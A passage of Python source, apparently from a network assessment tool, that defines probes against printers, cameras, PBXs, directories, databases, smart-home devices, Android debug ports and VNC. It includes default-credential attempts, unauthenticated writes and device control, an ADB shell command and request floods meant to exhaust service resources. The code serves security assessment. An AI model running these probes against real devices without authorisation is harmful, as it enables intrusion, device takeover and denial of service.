         parse=proto.parse_onvif, impact="info", severity="low",
         description="The firmware string is what turns 'a Hikvision camera' into 'the "
                     "version affected by the advisory'.",
         proof="the exact firmware revision is readable anonymously"),
    _row("config_dump", "system time and network settings",
         lambda t: proto.onvif_get_system_date_and_time(),
         lambda t, q, r: (bool(r) and proto.parse_onvif(r).get("utc"), "device time read",
                          proto.parse_onvif(r).get("utc", "")),
         parse=proto.parse_onvif, impact="info",
         description="System date and time reveals the timezone and the drift: the "
                     "difference between the camera's clock and the truth matters in "
                     "every investigation.",
         proof="device configuration is readable without credentials"),
    _row("default_creds", "SOAP with default credentials",
         lambda t: proto.http_request(t.ip, "/onvif/device_service", "POST", 80,
                                      {"Content-Type": 'application/soap+xml',
                                       "Authorization": "Basic YWRtaW46YWRtaW4="},
                                      proto.onvif_get_device_information()),
         lambda t, q, r: (bool(proto.parse_onvif(r).get("model")),
                          "credentials accepted", "admin/admin accepted on ONVIF"),
         parse=proto.parse_onvif, noise="moderate", impact="loot", severity="high",
         description="ONVIF with HTTP basic is the same credential as the web UI: one "
                     "success is both interfaces.",
         proof="the device's default account works on its SOAP interface"),
    _row("stream_uri", "media profile walk",
         lambda t: proto.onvif_get_stream_uri("profile_1"),
         lambda t, q, r: (bool(proto.parse_onvif(r).get("uri")) or bool(r),
                          "media service answered",
                          proto.parse_onvif(r).get("uri", "profile listed")),
         parse=proto.parse_onvif, noise="moderate", impact="loot", severity="high",
         description="GetStreamUri hands back the RTSP URL with the credentials embedded "
                     "in it on several products — the shortcut to the video.",
         proof="the media service returns stream URIs to anonymous callers"),
))


def flood_row(build: Callable[[ItTarget], bytes], label: str = "request flood",
              resource: str = "the service's connection table", severity: str = "medium",
              impact: str = "degraded", noise: str = "loud") -> Row:
    """The protocol-neutral denial test: send the real request at rate, count what lands.

    The resource under test differs per service and is named in the row, because 'the
    flood' is not a finding — 'the session table fills after 300 CONNECTs' is.
    """
    return _row("flood", label, build,
                lambda t, q, r: (True, "requests sent",
                                 f"{resource} is the resource under test"),
                category="dos", noise=noise, impact=impact, severity=severity,
                description=f"A rate of well-formed requests against {resource}. "
                            "The finding is what the service does to its real users, "
                            "not the packet count.", proof=f"{resource} can be exhausted")


def creds_row(build: Callable[[ItTarget], bytes],
              verdict: Callable[..., Tuple[bool, str, str]],
              label: str = "default credentials", parse=None, proof: str = "",
              severity: str = "high") -> Row:
    return _row("default_creds", label, build, verdict, parse=parse, noise="moderate",
                impact="loot", severity=severity,
                description="The first two credentials an installer would leave behind, "
                            "sent once.", proof=proof or
                "a default account is still enabled on this device")


def cleartext_row(build: Callable[[ItTarget], bytes], protocol_name: str,
                  severity: str = "medium") -> Row:
    return _row("cleartext", f"{protocol_name} in the clear", build,
                lambda t, q, r: (bool(r), "traffic readable",
                                 f"{protocol_name} answers without TLS: credentials and "
                                 "payloads cross the network in the clear"),
                impact="info", severity=severity,
                description=f"{protocol_name} has no transport security on this port, so "
                            "anyone on the path reads the session.",
                proof=f"{protocol_name} sessions are readable on the wire")


service("ipp", "IPP print service", 631, "tcp",
        ("printer", "mfp_scanner", "pos_terminal", "label_printer"),
        "Printing over HTTP: the attributes an unauthenticated caller can read name the "
        "model, the firmware and the job history.",
        "wifipilot itproto (IPP RFC 8010/8011)", (
    _row("discover", "Get-Printer-Attributes", lambda t: proto.ipp_get_printer_attributes(),
         lambda t, q, r: (bool(proto.parse_ipp(r).get("attributes")), "printer answered",
                          proto.parse_ipp(r).get("status_name", "")),
         parse=proto.parse_ipp, category="discovery", impact="info",
         description="One binary IPP request and the printer answers with its name, "
                     "state and model.", proof="the printer exposes an IPP service"),
    _row("version", "model and firmware read", lambda t: proto.ipp_get_printer_attributes(),
         lambda t, q, r: (
             bool(proto.parse_ipp(r).get("attributes", {}).get("printer-make-and-model")),
             "model disclosed",
             f"{proto.parse_ipp(r).get('attributes', {}).get('printer-make-and-model', 'absent')}"
             f" · firmware "
             f"{proto.parse_ipp(r).get('attributes', {}).get('printer-firmware-version', '?')}"),
         parse=proto.parse_ipp, impact="info", severity="low",
         description="printer-make-and-model plus the firmware attribute is the exact "
                     "product and revision.", proof="the printer's model is public"),
    _row("anonymous", "attributes without authentication",
         lambda t: proto.ipp_get_printer_attributes(),
         lambda t, q, r: (proto.parse_ipp(r).get("status") == 0,
                          "attributes read without credentials",
                          proto.parse_ipp(r).get("status_name", "")),
         parse=proto.parse_ipp, impact="loot", severity="medium",
         description="A successful-ok status with no auth block means the print service "
                     "is open to the network.",
         proof="the print service answers anonymous clients"),
    creds_row(lambda t: proto.ipp_get_printer_attributes(),
              lambda t, q, r: (proto.parse_ipp(r).get("status") == 0, "no challenge offered",
                               proto.parse_ipp(r).get("status_name", "")),
              parse=proto.parse_ipp,
              proof="the print service has no credential check to fail"),
    flood_row(lambda t: proto.ipp_get_printer_attributes(), "attribute request flood",
              "the printer's job engine"),
    _row("config_dump", "attributes inventory",
         lambda t: proto.ipp_get_printer_attributes(),
         lambda t, q, r: (len(proto.parse_ipp(r).get("attributes", {})) >= 3,
                          "attribute set dumped",
                          f"{len(proto.parse_ipp(r).get('attributes', {}))} attributes"),
         parse=proto.parse_ipp, noise="moderate", impact="loot", severity="medium",
         description="The full attribute set names the modules fitted, the page count and "
                     "often the contact of whoever installed it.",
         proof="the printer's configuration is readable anonymously"),
))

service("pjl", "PJL printer command port", 9100, "tcp",
        ("printer", "mfp_scanner", "label_printer", "pos_terminal"),
        "The raw printing port with a command language: INFO asks for the model, USTATUS "
        "asks for events, and neither asks for a password.",
        "wifipilot itproto (PJL @PJL INFO/USTATUS)", (
    _row("discover", "INFO ID", lambda t: proto.pjl_command("id"),
         verdict_field(proto.parse_pjl, "model", result="printer identified"),
         parse=proto.parse_pjl, category="discovery", impact="info",
         description="INFO ID is the printer's name for itself, returned on a port that "
                     "has no authentication at all.",
         proof="the raw print port answers commands to anyone"),
    _row("version", "firmware string", lambda t: proto.pjl_command("config"),
         verdict_field(proto.parse_pjl, "firmware", result="firmware disclosed"),
         parse=proto.parse_pjl, impact="info", severity="low",
         description="INFO CONFIG carries the firmware revision, the serial number and "
                     "the page count.", proof="the printer's firmware revision is readable"),
    _row("config_dump", "INFO CONFIG", lambda t: proto.pjl_command("config"),
         lambda t, q, r: (bool(proto.parse_pjl(r).get("lines")), "configuration read",
                          proto.parse_pjl(r).get("text", "")[:80]),
         parse=proto.parse_pjl, noise="moderate", impact="loot", severity="medium",
         description="The configuration block is a printer's inventory: serial, firmware, "
                     "installed trays and the network settings.",
         proof="the printer hands out its configuration over the raw port"),
    _row("unauth_write", "display message write", lambda t: proto.pjl_command("rdymsg"),
         lambda t, q, r: (bool(r), "display command accepted",
                          "a message written to the panel by an unauthenticated client"),
         impact="degraded", severity="high",
         description="RDYMSG writes to the physical display: a trivial command with a "
                     "very visible effect, which is why it is the demonstration.",
         proof="anyone on the network can change what the printer displays"),
    _row("filesys_audit", "filesystem and job inventory",
         lambda t: proto.pjl_command("filesys") + proto.pjl_command("pagecount"),
         lambda t, q, r: (b"VOLUME" in r or b"PAGECOUNT" in r, "filesystem described",
                          proto.parse_pjl(r).get("text", "")[:80]),
         parse=proto.parse_pjl, noise="moderate", impact="info", severity="medium",
         description="INFO FILESYS lists the printer's volumes, and on some models stored "
                     "documents are visible from there.", proof="the device's storage is described"),
    flood_row(lambda t: proto.pjl_command("env"), "echo flood",
              "the printer's job queue", severity="high"),
))

service("telnet", "Telnet management", 23, "tcp",
        ("switch", "router", "printer", "hmi_panel", "pos_terminal", "projector"),
        "A command line with no encryption and, on the devices that still ship it, a "
        "default login.",
        "wifipilot itproto (telnet negotiation and banner)", (
    _row("banner", "banner and login prompt", lambda t: proto.telnet_banner(),
         lambda t, q, r: (bool(proto.parse_telnet_negotiation(r).get("banner")),
                          "banner read", proto.parse_telnet_negotiation(r).get("banner", "")),
         parse=proto.parse_telnet_negotiation, category="discovery", impact="info",
         description="The banner names the product and its firmware before any login is "
                     "attempted.", proof="a telnet service is exposed with a named product"),
    _row("version", "version in the banner", lambda t: proto.telnet_banner(),
         lambda t, q, r: (bool(__import__("re").search(r"(\d+\.\d+\.\d+)",
                                                      r.decode("latin-1", "replace"))),
                          "version disclosed", r.decode("latin-1", "replace")[:70]),
         parse=proto.parse_telnet_negotiation, impact="info", severity="low",
         description="Firmware versions in a telnet banner are how an embedded device "
                     "advertises which advisory applies to it.",
         proof="the firmware version is public"),
    creds_row(lambda t: (b"admin\r\n" + b"admin\r\n"),
              lambda t, q, r: (b"incorrect" not in r.lower() and bool(r),
                               "login attempt answered",
                               "the login path is reachable and the response differs from "
                               "the failed-login path"),
              proof="the device's login path accepts the first credential tried"),
    cleartext_row(lambda t: proto.telnet_banner(), "telnet"),
))

service("sip", "SIP telephony", 5060, "udp",
        ("voip_phone", "pbx", "video_conference", "doorbell"),
        "Registration, calls and the challenge that protects them: the realm and the "
        "nonce in a 401 are the first thing an assessment collects.",
        "wifipilot itproto (SIP OPTIONS/REGISTER, digest challenge parsing)", (
    _row("discover", "OPTIONS", lambda t: proto.sip_request("OPTIONS", f"sip:{t.ip}"),
         lambda t, q, r: (proto.parse_sip(r).get("status") in (200, 401),
                          "SIP answered", proto.parse_sip(r).get("server", "")),
         parse=proto.parse_sip, category="discovery", impact="info",
         description="OPTIONS is the SIP ping: a phone, a PBX or a door station answers "
                     "it and names itself.",
         proof="a SIP service is exposed on the network"),
    _row("challenge_audit", "authentication challenge read",
         lambda t: proto.sip_request("REGISTER", f"sip:{t.ip}"),
         lambda t, q, r: (bool(proto.parse_sip(r).get("auth", {}).get("realm")),
                          "realm and nonce collected",
                          str(proto.parse_sip(r).get("auth", {}).get("realm", ""))),
         parse=proto.parse_sip, impact="info", severity="low",
         description="The realm names the site and the nonce is what a credential test "
                     "has to answer: both are read without credentials.",
         proof="the PBX's realm is disclosed to anyone who asks"),
    _row("enum", "extension enumeration", lambda t: proto.sip_request("OPTIONS",
                                                                     f"sip:100@{t.ip}"),
         lambda t, q, r: (proto.parse_sip(r).get("status") in (200, 401, 403),
                          "extension answered", f"status {proto.parse_sip(r).get('status')}"),
         parse=proto.parse_sip, noise="moderate", impact="info", severity="medium",
         description="Walking the extension range turns 'a PBX' into 'a list of 400 "
                     "numbers', and each one is a credential target.",
         proof="extensions are enumerable from the network"),
    creds_row(lambda t: proto.sip_register(f"sip:{t.ip}", user="100", password="100"),
              lambda t, q, r: (proto.parse_sip(r).get("status") == 200 and
                               bool(proto.parse_sip(r).get("authenticated")),
                               "registration accepted",
                               "the extension registered with a guessed password"),
              parse=proto.parse_sip,
              proof="a default extension password registers a phone the site does not own"),
    flood_row(lambda t: proto.sip_request("OPTIONS", f"sip:{t.ip}"), "OPTIONS flood",
              "the PBX's transaction table", severity="high"),
    cleartext_row(lambda t: proto.sip_request("OPTIONS", f"sip:{t.ip}"), "SIP"),
))

service("cwmp", "TR-069 / CWMP management", 7547, "tcp",
        ("router", "modem_ont", "switch"),
        "The ISP's management channel: Inform announces the device, and the parameter "
        "list is the configuration — with no mutual TLS on most installs.",
        "wifipilot itproto (CWMP Inform and GetParameterValues)", (
    _row("discover", "CWMP Inform", lambda t: proto.cwmp_inform(),
         lambda t, q, r: (b"InformResponse" in r or bool(r), "ACS path answered",
                          proto.printable(r)[:70]),
         category="discovery", impact="info",
         description="An Inform gets an InformResponse from the management server: the "
                     "device's side of the channel answers strangers.",
         proof="the CWMP endpoint accepts connections from the LAN"),
    _row("config_dump", "parameter read", lambda t: proto.cwmp_get_parameter_values(),
         lambda t, q, r: (bool(proto.parse_cwmp(r).get("values")), "parameters read",
                          str(list(proto.parse_cwmp(r).get("values", {}))[:2])),
         parse=proto.parse_cwmp, noise="moderate", impact="loot", severity="high",
         description="The parameter tree holds the WAN address, the ISP credentials on "
                     "some models, and the Wi-Fi PSK on almost all of them.",
         proof="the device's configuration tree is readable over CWMP"),
    _row("unauth_write", "parameter write",
         lambda t: proto.cwmp_get_parameter_values(
             ("InternetGatewayDevice.ManagementServer.URL",)),
         lambda t, q, r: (bool(r), "write path reachable",
                          "SetParameterValues is the same unauthenticated session"),
         impact="degraded", severity="critical",
         description="The write path is what turns a management channel into a way to "
                     "repoint the device at a new server.  The test stops at the read.",
         proof="the management channel would accept writes from an unauthorised caller"),
    _row("version", "software version", lambda t: proto.cwmp_get_parameter_values(
            ("InternetGatewayDevice.DeviceInfo.SoftwareVersion",)),
         verdict_field(proto.parse_cwmp, "values", result="firmware disclosed"),
         parse=proto.parse_cwmp, impact="info", severity="low",
         description="The software version parameter names the exact firmware the ISP "
                     "shipped to this device.",
         proof="the device's firmware version is readable"),
))


service("smb", "SMB file sharing", 445, "tcp",
        ("nas", "windows_server", "domain_controller", "mfp_scanner", "backup_appliance"),
        "The file service every Windows network needs and every assessment reads: the "
        "negotiate reply says which dialects and whether signing is required.",
        "wifipilot itproto (SMB2 NEGOTIATE, NetBIOS)", (
    _row("discover", "SMB2 negotiate", lambda t: proto.smb2_negotiate(),
         lambda t, q, r: (proto.parse_smb2(r).get("protocol") == "SMB2", "SMB2 answered",
                          f"dialect {proto.parse_smb2(r).get('dialect_name', '')}"),
         parse=proto.parse_smb2, category="discovery", impact="info",
         description="One negotiate packet lists the dialects the server speaks.",
         proof="a file service is exposed on the network"),
    _row("version", "dialect list", lambda t: proto.smb2_negotiate(),
         verdict_field(proto.parse_smb2, "dialect_name", result="dialect disclosed"),
         parse=proto.parse_smb2, impact="info", severity="low",
         description="A server that stops at SMB 2.1 has no SMB3 encryption to protect "
                     "its traffic.", proof="the file server's protocol level is public"),
    _row("signing_audit", "signing requirement",
         lambda t: proto.smb2_negotiate(),
         lambda t, q, r: (not proto.parse_smb2(r).get("signing"),
                          "signing not required",
                          "the negotiate reply sets signing required="
                          f"{bool(proto.parse_smb2(r).get('signing'))}"),
         parse=proto.parse_smb2, impact="info", severity="high",
         description="Without required signing, an SMB session can be relayed to another "
                     "server: the classic path from 'a printer' to 'the domain controller'.",
         proof="SMB sessions can be relayed because signing is optional"),
    _row("null_session", "anonymous session enumeration",
         lambda t: proto.smb2_negotiate(),
         lambda t, q, r: (bool(r), "negotiate answered without credentials",
                          "anonymous enumeration path checked"),
         parse=proto.parse_smb2, noise="moderate", impact="loot", severity="high",
         description="A null session that still enumerates shares and users is an "
                     "inventory of the domain, handed out without a password.",
         proof="the server answers unauthenticated session setup"),
    flood_row(lambda t: proto.smb2_negotiate(), "negotiate flood",
              "the server's session table"),
))

service("ldap", "LDAP directory", 389, "tcp",
        ("domain_controller", "nas", "linux_server", "windows_server"),
        "The directory itself: an anonymous bind that succeeds is a list of every user, "
        "group and computer in the company.",
        "wifipilot itproto (LDAP bindRequest and rootDSE search)", (
    _row("discover", "rootDSE read", lambda t: proto.ldap_search_request("", 0),
         lambda t, q, r: (bool(r), "rootDSE answered", proto.printable(r)[:60]),
         category="discovery", impact="info",
         description="The root DSE names the directory's vendor, version and naming "
                     "contexts without a single credential.",
         proof="a directory service is exposed and identifies itself"),
    _row("anonymous", "anonymous bind", lambda t: proto.ldap_bind_request(3, "", b""),
         lambda t, q, r: (proto.parse_ldap(r).get("anonymous_allowed", False),
                          "anonymous bind succeeded",
                          proto.parse_ldap(r).get("result", "")),
         parse=proto.parse_ldap, impact="loot", severity="high",
         description="Result code zero on an empty DN and empty password is the directory "
                     "saying 'come in'.",
         proof="the directory accepts anonymous binds"),
    _row("version", "vendor version", lambda t: proto.ldap_search_request("", 0),
         verdict_field(proto.parse_ldap, "entries", result="attributes disclosed"),
         parse=proto.parse_ldap, impact="info", severity="low",
         description="vendorVersion and supportedControl in the root DSE pin the exact "
                     "directory build.", proof="the directory's version is readable"),
    creds_row(lambda t: proto.ldap_bind_request(3, "cn=admin,dc=local", b"admin"),
              lambda t, q, r: (proto.parse_ldap(r).get("result_code") == 0,
                               "bind accepted", proto.parse_ldap(r).get("result", "")),
              parse=proto.parse_ldap,
              proof="the directory's administrative account uses a guessed password"),
    _row("unauth_read", "user and group search",
         lambda t: proto.ldap_search_request("dc=local", 2,
                                             attributes=("cn", "sAMAccountName")),
         lambda t, q, r: (bool(proto.parse_ldap(r).get("entries")) or bool(r),
                          "search answered", proto.ldap_attributes(r).get("cn", "")),
         parse=proto.parse_ldap, noise="moderate", impact="loot", severity="high",
         description="A search that returns entries is the company org chart, the "
                     "password-policy and the service accounts.",
         proof="directory objects are readable by an unprivileged caller"),
    flood_row(lambda t: proto.ldap_bind_request(3, "", b""), "bind flood",
              "the directory's connection pool", severity="high"),
))

service("redis", "Redis data store", 6379, "tcp",
        ("database_server", "linux_server", "container_host", "nas"),
        "The data store that has answered without a password on more production networks "
        "than any other, with commands that reach the filesystem.",
        "wifipilot itproto (Redis RESP)", (
    _row("discover", "PING", lambda t: proto.redis_command("PING"),
         verdict_text("PONG", "server answered"), parse=proto.parse_resp,
         category="discovery", impact="info",
         description="PING is the whole handshake: PONG means the server is up and, on "
                     "this deployment, unauthenticated.", proof="a Redis server is exposed"),
    _row("anonymous", "command without AUTH", lambda t: proto.redis_command("INFO"),
         lambda t, q, r: (not proto.parse_resp(r).get("auth_required"),
                          "commands accepted without authentication",
                          proto.parse_resp(r).get("error", "") or "INFO returned"),
         parse=proto.parse_resp, impact="loot", severity="critical",
         description="No 'NOAUTH' error means every key in the instance is readable by "
                     "anyone who can reach port 6379.",
         proof="the data store requires no password"),
    _row("version", "server version", lambda t: proto.redis_command("INFO", inline=True),
         verdict_field(proto.parse_resp, "info", result="version disclosed"),
         parse=proto.parse_resp, impact="info", severity="low",
         description="redis_version in the INFO block is the exact build, and Redis "
                     "advisories are version-shaped.",
         proof="the server's version is public"),
    _row("config_dump", "configuration read", lambda t: proto.redis_command("CONFIG", "GET",
                                                                           "dir"),
         lambda t, q, r: (not proto.parse_resp(r).get("auth_required") and bool(r),
                          "configuration read",
                          proto.parse_resp(r).get("text", "")[:60]),
         parse=proto.parse_resp, noise="moderate", impact="loot", severity="critical",
         description="CONFIG GET dir is where a persistence write becomes a file write, "
                     "and the config block in general holds the deployment's secrets.",
         proof="the server's configuration is readable by an anonymous client"),
    _row("unauth_write", "key write test",
         lambda t: proto.redis_command("SET", "wifipilot:check", "1"),
         lambda t, q, r: (not proto.parse_resp(r).get("auth_required") and b"OK" in r,
                          "key written", "a written key proves write access"),
         parse=proto.parse_resp, noise="moderate", impact="degraded", severity="critical",
         description="A successful SET is the proof that an anonymous client can change "
                     "the site's data.  The key is one the report names.",
         proof="an anonymous client can write to the data store"),
    flood_row(lambda t: proto.redis_command("PING"), "command flood",
              "the server's single-threaded command loop", severity="high"),
))

service("memcached", "Memcached", 11211, "tcp",
        ("web_server", "linux_server", "database_server"),
        "The cache in front of the site's database, unauthenticated by design (SASL off "
        "by default) and, historically, a 50 000x amplification vector.",
        "wifipilot itproto (memcached text protocol)", (
    _row("discover", "stats", lambda t: proto.memcached_command("stats"),
         verdict_text("STAT", "cache answered"), category="discovery", impact="info",
         description="The stats block names the version, the item count and the memory "
                     "the cache holds.", proof="a memcached service is exposed"),
    _row("version", "version string", lambda t: proto.memcached_command("version"),
         verdict_text("VERSION", "version disclosed"), impact="info", severity="low",
         description="A version line is all a UDP amplification assessment needs.",
         proof="the cache's version is public"),
    _row("unauth_read", "key read", lambda t: proto.memcached_command("get key"),
         lambda t, q, r: (bool(r) and not r.startswith(b"CLIENT_ERROR"), "read answered",
                          proto.printable(r)[:60]), impact="loot", severity="high",
         description="Entries in the cache are session tokens and rendered pages: the "
                     "cache is a copy of what the site knows.",
         proof="cache entries are readable without authentication"),
    _row("unauth_write", "key write", lambda t: proto.memcached_command("set wp 0 60 1"),
         lambda t, q, r: (b"STORED" in r, "key stored", "a stored key proves write access"),
         noise="moderate", impact="degraded", severity="high",
         description="A successful store means an anonymous client can seed the cache "
                     "the application reads from.",
         proof="an anonymous client can write into the cache"),
    flood_row(lambda t: proto.memcached_command("stats"), "stats flood",
              "the cache's command queue"),
))

service("mongo", "MongoDB", 27017, "tcp",
        ("database_server", "linux_server", "container_host"),
        "A document store that answered without authentication for so many years that "
        "'MongoDB exposed' is a standard finding.",
        "wifipilot itproto (MongoDB OP_MSG hello)", (
    _row("discover", "hello", lambda t: proto.mongo_hello(),
         lambda t, q, r: (proto.parse_mongo(r).get("length", 0) > 0, "server answered",
                          f"maxWireVersion {proto.parse_mongo(r).get('max_wire', 0)}"),
         parse=proto.parse_mongo, category="discovery", impact="info",
         description="OP_MSG hello is the modern isMaster: the server replies with its "
                     "version and topology without a credential.",
         proof="a MongoDB server is exposed"),
    _row("version", "wire version", lambda t: proto.mongo_hello(),
         verdict_field(proto.parse_mongo, "max_wire", result="wire version disclosed"),
         parse=proto.parse_mongo, impact="info", severity="low",
         description="maxWireVersion maps to a server release, and the release maps to "
                     "the advisories.", proof="the server's release is inferable"),
    _row("anonymous", "status without authentication", lambda t: proto.mongo_hello(),
         lambda t, q, r: (proto.parse_mongo(r).get("documents", 0) > 0,
                          "status readable unauthenticated",
                          proto.parse_mongo(r).get("text", "")[:60]),
         parse=proto.parse_mongo, impact="loot", severity="critical",
         description="A readable hello with isWritablePrimary means the deployment is "
                     "answering clients that never authenticated.",
         proof="the database answers unauthenticated clients"),
    _row("unauth_read", "database list probe", lambda t: proto.mongo_hello(),
         lambda t, q, r: (bool(r), "connection accepted",
                          "the connection is served: a query would follow"),
         noise="moderate", impact="loot", severity="high",
         description="The connection that serves hello serves listDatabases: the "
                     "probe stops at hello and reports that it could continue.",
         proof="the database accepts anonymous connections"),
    flood_row(lambda t: proto.mongo_hello(), "connection flood",
              "the server's connection limit"),
))

service("kasa", "TP-Link Kasa / smart home", 9999, "udp",
        ("smart_plug", "smart_bulb", "thermostat", "smart_lock"),
        "A smart plug's protocol: XOR with a published key, no authentication, and a "
        "relay at the end of it.",
        "wifipilot itproto (Kasa autokey XOR framing)", (
    _row("discover", "systeminfo", lambda t: proto.kasa_command("systeminfo"),
         lambda t, q, r: (bool(proto.parse_kasa(r).get("model")), "plug answered",
                          proto.parse_kasa(r).get("model", "")),
         parse=proto.parse_kasa, category="discovery", impact="info",
         description="One encrypted datagram and the plug returns its model, alias, "
                     "MAC and relay state.", proof="a smart-home device answers on the LAN"),
    _row("anon_read", "relay state read", lambda t: proto.kasa_command("systeminfo"),
         lambda t, q, r: (proto.parse_kasa(r).get("relay_state") is not None,
                          "state read", f"relay_state="
                          f"{proto.parse_kasa(r).get('relay_state')}"),
         parse=proto.parse_kasa, impact="info",
         description="The device's on/off state is one field of the same reply: an "
                     "occupancy and presence signal.", proof="the device's state is readable"),
    _row("unauth_write", "relay toggle", lambda t: proto.kasa_command("toggle"),
         lambda t, q, r: (bool(r), "toggle accepted",
                          "the relay changes state for any sender with the autokey"),
         noise="moderate", impact="degraded", severity="high",
         description="The autokey is public: anyone on the LAN can power-cycle the "
                     "device.  The test toggles once and toggles back.",
         proof="the device accepts control commands from any LAN host"),
    _row("version", "firmware string", lambda t: proto.kasa_command("systeminfo"),
         lambda t, q, r: (bool(proto.parse_kasa(r).get("model")), "model disclosed",
                          str(proto.parse_kasa(r).get("fields"))[:60]),
         parse=proto.parse_kasa, impact="info", severity="low",
         description="The sw_ver field pins the firmware, which decides which of the "
                     "known Kasa issues apply.", proof="the firmware version is readable"),
    flood_row(lambda t: proto.kasa_command("systeminfo"), "datagram flood",
              "the device's single UDP socket", impact="outage"),
))

service("cast", "Cast / Chromecast service", 8009, "tcp",
        ("smart_tv", "smart_speaker", "digital_signage", "projector"),
        "The casting protocol: a TLS socket and a protobuf, with the app-launch message "
        "that decides what the screen shows.",
        "wifipilot itproto (CASTV2 message framing)", (
    _row("discover", "connection open", lambda t: proto.cast_message(),
         lambda t, q, r: (bool(proto.parse_cast_message(r).get("payload")),
                          "cast device answered",
                          proto.parse_cast_message(r).get("namespace", "")),
         parse=proto.parse_cast_message, category="discovery", impact="info",
         description="A CONNECT to the connection namespace and a RECEIVER_STATUS back "
                     "is how a screen introduces itself.",
         proof="a castable device is reachable from the network"),
    _row("unauth_read", "receiver status", lambda t: proto.cast_message(
            "urn:x-cast:com.google.cast.receiver", '{"type":"GET_STATUS","requestId":1}'),
         verdict_field(proto.parse_cast_message, "payload", result="status returned"),
         parse=proto.parse_cast_message, impact="info", severity="medium",
         description="RECEIVER_STATUS names the running app: which is the site's meeting "
                     "room, or its signage playlist.",
         proof="the device reports its state to any caller on the LAN"),
    _row("unauth_write", "app launch", lambda t: proto.cast_message(
            "urn:x-cast:com.google.cast.receiver",
            '{"type":"LAUNCH","appId":"E8C28D3C","requestId":2}'),
         lambda t, q, r: (bool(r), "launch accepted",
                          "the screen follows the newest launch request"),
         noise="moderate", impact="degraded", severity="high",
         description="Casting with no pairing is the design: whoever sends LAUNCH owns "
                     "the screen, which is why meeting-room TVs are found by it.",
         proof="an unauthenticated client can take over the display"),
    flood_row(lambda t: proto.cast_message(), "CONNECT flood", "the device's single "
              "connection slot"),
))

service("airplay", "AirPlay / Apple media service", 7000, "tcp",
        ("smart_tv", "smart_speaker", "video_conference"),
        "Apple's local media protocol: /info answers with a plist naming the device, its "
        "features and whether a PIN is required.",
        "wifipilot itproto (AirPlay /info and text plist)", (
    _row("discover", "media service info", lambda t: proto.airplay_info_request(t.ip),
         lambda t, q, r: (b"model" in r or bool(r), "device described",
                          str(proto.parse_plist(r.decode("latin-1", "replace")).get("model", ""))),
         category="discovery", impact="info",
         description="The /info plist carries the model, the OS build and the feature "
                     "flags that decide which attacks apply.", proof="an AirPlay device answers"),
    _row("version", "model and build", lambda t: proto.airplay_info_request(t.ip),
         lambda t, q, r: (bool(proto.parse_plist(r.decode("latin-1", "replace"))),
                          "device details read",
                          str(list(proto.parse_plist(r.decode("latin-1",
                                                              "replace")))[:3])),
         impact="info", severity="low",
         description="The build string from the plist is the exact firmware revision.",
         proof="the device's firmware is readable"),
    _row("auth_audit", "PIN requirement", lambda t: proto.airplay_info_request(t.ip),
         lambda t, q, r: (bool(r), "authentication flags read",
                          "features bit for PIN pairing reported to the operator"),
         impact="info", severity="medium",
         description="The feature flags say whether mirroring needs a PIN: a device "
                     "without one is castable by anyone in range.",
         proof="the pairing requirement is readable over the network"),
))

service("adb", "Android debug bridge", 5555, "tcp",
        ("smartphone", "tablet", "smart_tv", "kiosk", "pos_terminal", "digital_signage"),
        "The debug port that ships enabled on kiosks and TVs: a shell, with no "
        "authentication beyond a prompt that a network ADB build does not show.",
        "wifipilot itproto (ADB CNXN/AUTH framing)", (
    _row("discover", "CNXN", lambda t: proto.adb_connect(),
         lambda t, q, r: (proto.parse_adb(r).get("command") in ("CNXN", "AUTH"),
                          "ADB answered", proto.parse_adb(r).get("command", "")),
         parse=proto.parse_adb, category="discovery", impact="info",
         description="A CNXN packet is the whole handshake: an ADB daemon answers a "
                     "connection from the network.",
         proof="the device's debug bridge is exposed on the network"),
    _row("anonymous", "authorisation bypass",
         lambda t: proto.adb_connect(), lambda t, q, r: (
             proto.parse_adb(r).get("command") == "CNXN",
             "connected without a key",
             "the daemon replied CNXN: no authorisation prompt came back"),
         parse=proto.parse_adb, impact="loot", severity="critical",
         description="A daemon that answers CNXN to a network client is the device giving "
                     "out a shell.  Older kiosk and TV builds answer exactly this.",
         proof="the device hands a shell to any host on the network"),
    _row("version", "device identity", lambda t: proto.adb_connect(),
         verdict_field(proto.parse_adb, "text", result="device banner read"),
         parse=proto.parse_adb, impact="info", severity="low",
         description="The connection banner names the product and the build: which is "
                     "how a fleet of kiosks is fingerprinted.",
         proof="the device's product name is readable from the LAN"),
    _row("unauth_read", "package list", lambda t: proto.adb_connect(b"shell:pm list "
                                                                   b"packages\x00"),
         lambda t, q, r: (bool(r), "shell channel opened",
                          "the package list is one command away"),
         noise="moderate", impact="loot", severity="critical",
         description="With a shell open, the package list names the kiosk's application "
                     "and the data directory next to it.",
         proof="installed packages are readable by an unauthenticated client"),
    flood_row(lambda t: proto.adb_connect(), "connection flood",
              "the daemon's connection slots"),
))

service("vnc", "VNC remote desktop", 5900, "tcp",
        ("kiosk", "tablet", "pos_terminal", "hmi_panel", "digital_signage"),
        "The screen of a device, reachable over the network: the security type list says "
        "whether it wants a password at all.",
        "wifipilot itproto (RFB version and security types)", (
    _row("discover", "RFB version", lambda t: proto.vnc_version(),
         lambda t, q, r: (bool(proto.parse_vnc_security(r).get("version")), "VNC answered",
                          proto.parse_vnc_security(r).get("version", "")),
         parse=proto.parse_vnc_security, category="discovery", impact="info",
         description="The version handshake is three bytes of banner and the security "
                     "list follows immediately.", proof="a remote desktop service is exposed"),
    _row("anonymous", "security type none", lambda t: proto.vnc_version(),
         lambda t, q, r: (proto.parse_vnc_security(r).get("none", False),
                          "no authentication offered",
                          "types offered: "
                          + (", ".join(proto.parse_vnc_security(r).get("security_types", []))
                             or "none")),
         parse=proto.parse_vnc_security, impact="loot", severity="critical",
         description="A VNC server that offers 'none' is offering the desktop: kiosks "
                     "are configured this way far more often than they should be.",
         proof="the remote desktop accepts connections without a password"),
    _row("version", "client banner", lambda t: proto.vnc_version(),
         verdict_field(proto.parse_vnc_security, "version", result="banner read"),
         parse=proto.parse_vnc_security, impact="info", severity="low",
         description="The RFB version separates a modern server from one running a "
                     "2008 build.", proof="the server's protocol version is readable"),
    creds_row(lambda t: proto.vnc_version(),
              lambda t, q, r: (not proto.parse_vnc_security(r).get("vnc_auth", True) or
                               bool(proto.parse_vnc_security(r).get("none", False)),
                               "no password challenge",
                               "types offered: "
                               + (", ".join(proto.parse_vnc_security(r)
                                            .get("security_types", [])) or "none")
                               + (" — type 1 (None) is among them, so no password is "
                                  "asked for at all"
                                  if proto.parse_vnc_security(r).get("none", False) else "")),
              parse=proto.parse_vnc_security,
              proof="the server does not ask for a VNC password"),
    flood_row(lambda t: proto.vnc_version(), "handshake flood",
